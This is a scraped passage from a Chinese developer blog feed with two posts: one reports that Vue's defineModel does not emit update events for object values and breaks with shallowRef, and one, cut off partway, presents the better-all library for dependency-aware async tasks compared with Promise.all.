  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:32:44.000Z" title="Fri Jan 09 2026 03:32:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>先来看看<a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fcomponents%2Fv-model.html" target="_blank" title="https://cn.vuejs.org/guide/components/v-model.html" ref="nofollow noopener noreferrer">文档</a>对defineModel的描述和使用例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> model = <span class="hljs-title function_">defineModel</span>()

<span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
  model.<span class="hljs-property">value</span>++
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Parent bound v-model is: {{ model }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"update"</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"countModel"</span> /&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc3bba532dfb42cc87b7f2ab1c96a2ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=KBdVnFMSXMCIfQU%2FrZlsrOEuBGc%3D" alt="image.png" loading="lazy"/>
不过这里的简单例子中 v-model的类型是数字类型 对它的变更自然也只有直接赋值这一种方式</p>
<p>那么 如果v-model是对象呢？</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> countObj = defineModel&lt;{ <span class="hljs-attr">count</span>: number }&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"m-4"</span>&gt;</span>
    {{ countObj.count }}
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"
        () =&gt; {
          countObj.count++
        }
      "</span>
    &gt;</span>
      +1
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>

<span class="hljs-keyword">const</span> countObj = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"countObj"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>可以正常使用
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1775b5199be49fb888337d3cd2c6eca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=wmwGFhQMNvKCsZym%2B0AaUgGtLKI%3D" alt="动画.gif" loading="lazy"/>
v-model的value也是很正常的ref
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19142dd4abcc44b4b20f7340d85e3a65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=vlXPp3IZpdIRnWk0DXEHa5WaQCY%3D" alt="image.png" loading="lazy"/></p>
<p>然而如果改一下写法</p>
<pre><code class="hljs language-html" lang="html">  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span>
    <span class="hljs-attr">:model-value</span>=<span class="hljs-string">"countObj"</span>
    @<span class="hljs-attr">update:model-value</span>=<span class="hljs-string">"
      (val) =&gt; {
        debugger
        countObj = val
      }
    "</span>
  /&gt;</span>
</code></pre>
<p>就会发现<code>@update:model-value</code>根本没调用 这一点和文档是不一致的</p>
<p>如果countObj自身还是shallowRef(虽然一般也不会用) 那defineModel就会完全出错</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fb76d001a6b4c35bc402f9225cec056~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=gA%2F3s1fCvF5Abjdv%2FQD3f5GUplk%3D" alt="image.png" loading="lazy"/></p>
<p>这里的v-model甚至是一个完全没有响应性的变量 对它的变更不会触发渲染 也不会调用update事件</p>
<p>而如果使用之前的写法<code>model-value + @update</code> 就可以正常使用</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = defineProps&lt;{ <span class="hljs-attr">modelValue</span>: { <span class="hljs-attr">count</span>: number } }&gt;()
<span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  <span class="hljs-string">'update:modelValue'</span>: [<span class="hljs-attr">val</span>: { <span class="hljs-attr">count</span>: number }]
}&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"m-4"</span>&gt;</span>
    {{ modelValue.count }}
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"
        () =&gt; {
          emit('update:modelValue', { count: modelValue.count + 1 })
        }
      "</span>
    &gt;</span>
      +1
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>总结：1.defineModel的行为与文档不一致 2.shallowRef+defineModel会导致完全失效</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 Promise.all 的依赖困境：better-all 如何优雅管理异步任务]]></title>    <link>https://juejin.cn/post/7592906873089523758</link>    <guid>https://juejin.cn/post/7592906873089523758</guid>    <pubDate>2026-01-09T03:35:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592906873089523758" data-draft-id="7592884480732233774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 Promise.all 的依赖困境：better-all 如何优雅管理异步任务"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-09T03:35:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="代码诗人卡尔"/> <meta itemprop="url" content="https://juejin.cn/user/2067500101533902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 Promise.all 的依赖困境：better-all 如何优雅管理异步任务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2067500101533902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    代码诗人卡尔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:35:52.000Z" title="Fri Jan 09 2026 03:35:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代JavaScript异步编程中，<code>Promise.all</code>无疑是处理并发任务的利器。然而，当任务之间存在复杂的依赖关系时，<code>Promise.all</code>的局限性便会显现，开发者往往陷入手动优化和维护"依赖地狱"的困境。今天，我们将深入探讨一个名为<code>better-all</code>的库，它如何通过巧妙的设计，优雅地解决了这一痛点，并带来了更高效、更可读的异步任务管理方式。</p>
<h2 data-id="heading-0">Promise.all 的困境：当依赖遇上并发</h2>
<p><code>Promise.all</code>的设计初衷是并行执行一组独立的Promise，并在所有Promise都解决后返回结果。但当任务存在依赖时，事情就变得棘手了。让我们通过几个场景来理解<code>Promise.all</code>在处理依赖时的不足。</p>
<h3 data-id="heading-1">场景一：朴素的串行执行（低效）</h3>
<p>假设我们有三个异步函数 <code>getA()</code>, <code>getB()</code>, <code>getC(a)</code>，其中 <code>getC</code> 依赖于 <code>getA</code> 的结果。如果按照最直观的方式编写代码，可能会是这样：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// 假设 getA 耗时 1s, getB 耗时 10s, getC 耗时 10s</span>
<span class="hljs-keyword">const</span> [a, b] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>(), <span class="hljs-title function_">getB</span>()]) <span class="hljs-comment">// a: 1s, b: 10s → 此步耗时 10s</span>
<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getC</span>(a) <span class="hljs-comment">// c: 10s → 此步耗时 10s</span>
<span class="hljs-comment">// 总耗时约 20 秒</span>
</code></pre>
<p>在这个例子中，<code>getA()</code> 和 <code>getB()</code> 并行执行，耗时取决于较慢的 <code>getB()</code> (10s)。然后 <code>getC(a)</code> 串行执行，又耗时 10s。总耗时高达 20 秒。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08fd778c50b44f3f939e3d947fac3c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=LAIx%2FUD9lm%2F4uqUAjppcghli3wI%3D" alt="Gemini_Generated_Image_ih0vmrih0vmrih0v (1).png" loading="lazy"/></p>
<h3 data-id="heading-2">场景二：手动优化（复杂且脆弱）</h3>
<p>为了优化上述情况，我们可能会尝试手动调整 Promise 的组合方式，让 <code>getB()</code> 和 <code>getC(a)</code> 并行：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// 假设 getA 耗时 1s, getB 耗时 10s, getC 耗时 10s</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getA</span>() <span class="hljs-comment">// a: 1s -&gt; 此步耗时 1s</span>
<span class="hljs-keyword">const</span> [b, c] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  <span class="hljs-comment">// b: 10s, c: 10s -&gt; 此步耗时 10s</span>
  <span class="hljs-title function_">getB</span>(),
  <span class="hljs-title function_">getC</span>(a),
])
<span class="hljs-comment">// 总耗时约 11 秒</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a1c1d6f46954a3991b72cde30165d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=eKKh80m6Z0kaW04M%2BrvjfqCf8WU%3D" alt="Gemini_Generated_Image_r4mjomr4mjomr4mj (1).png" loading="lazy"/></p>
<p>这次优化后，总耗时降到了 11 秒，因为 <code>getA()</code> 完成后，<code>getB()</code> 和 <code>getC(a)</code> 可以并行。看起来不错，但问题来了：如果任务的耗时发生变化呢？</p>
<h3 data-id="heading-3">场景三：手动优化的反噬（难以维护）</h3>
<p>假设现在 <code>getA()</code> 耗时 10 秒，而 <code>getC()</code> 耗时 1 秒。我们再来看看手动优化后的代码表现：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// 假设 getA 耗时 10s, getB 耗时 10s, getC 耗时 1s</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getA</span>() <span class="hljs-comment">// a: 10s -&gt; 此步耗时 10s</span>
<span class="hljs-keyword">const</span> [b, c] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  <span class="hljs-comment">// b: 10s, c: 1s -&gt; 此步耗时 10s</span>
  <span class="hljs-title function_">getB</span>(),
  <span class="hljs-title function_">getC</span>(a),
])
<span class="hljs-comment">// 总耗时约 20 秒</span>
</code></pre>
<p>此时，总耗时又回到了 20 秒！而最初的朴素写法（场景一）在同样的情况下，总耗时却是 11 秒：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// 朴素写法在相同耗时下的表现：</span>
<span class="hljs-comment">// 假设 getA 耗时 10s, getB 耗时 10s, getC 耗时 1s</span>
<span class="hljs-keyword">const</span> [a, b] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>(), <span class="hljs-title function_">getB</span>()]) <span class="hljs-comment">// a: 10s, b: 10s → 此步耗时 10s</span>
<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getC</span>(a) <span class="hljs-comment">// c: 1s → 此步耗时 1s</span>
<span class="hljs-comment">// 总耗时约 11 秒</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a453295c56ae435c9733a727841b35b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=2hsZZNkgdaVYjZZB%2BapmGuD8DfA%3D" alt="Gemini_Generated_Image_g2lawjg2lawjg2la (1).png" loading="lazy"/></p>
<p>这说明手动优化不仅复杂，而且非常脆弱，难以适应任务耗时的动态变化。在真实世界中，任务的耗时往往受网络、服务器负载等多种因素影响，是不可预测的。为了正确优化，你甚至需要手动分析并声明复杂的依赖图，这会迅速导致代码难以管理和阅读：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> [[a, c], b] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> <span class="hljs-title function_">getC</span>(a).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> [a, c])), <span class="hljs-title function_">getB</span>()])
</code></pre>
<h2 data-id="heading-4">better-all 的解决方案：自动依赖优化与类型推断</h2>
<p><code>better-all</code>库的核心思想是提供一个增强版的<code>all</code>函数，它允许开发者以声明式的方式定义异步任务及其依赖，而无需手动管理Promise链或复杂的嵌套。它会自动分析任务间的依赖关系，并尽可能地并行执行任务，从而实现最大化的并发优化。</p>
<p>让我们看看<code>better-all</code>如何优雅地解决上述问题：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { all } <span class="hljs-keyword">from</span> <span class="hljs-string">'better-all'</span>

<span class="hljs-keyword">const</span> { a, b, c } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">all</span>({
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getA</span>()
  }, <span class="hljs-comment">// 假设耗时 1s</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getB</span>()
  }, <span class="hljs-comment">// 假设耗时 10s</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">c</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getC</span>(<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">a</span>)
  }, <span class="hljs-comment">// 假设耗时 10s，依赖任务 a</span>
})
<span class="hljs-comment">// 总耗时约 11 秒 - 实现了最优并行化！</span>
</code></pre>
<p>在这个例子中，<code>better-all</code>会自动识别出任务<code>c</code>依赖于任务<code>a</code>。它会立即启动所有任务，当任务<code>c</code>执行到<code>await this.$.a</code>时，如果任务<code>a</code>尚未完成，它会等待<code>a</code>完成；同时，任务<code>b</code>会独立并行执行。这样，<code>better-all</code>在保证依赖顺序的同时，最大限度地提升了并行度，<strong>无论任务耗时如何变化，都能保持最优或接近最优的执行效率</strong>。</p>
<p><code>better-all</code>的"魔法"在于其<code>this.$</code>对象，它让你能够以自然的方式访问其他任务的结果（作为Promise），从而清晰地表达依赖关系。库会确保所有任务尽早启动，并在遇到依赖时智能等待。</p>
<h3 data-id="heading-5">更多应用场景</h3>
<p><strong>带有依赖的任务：</strong></p>
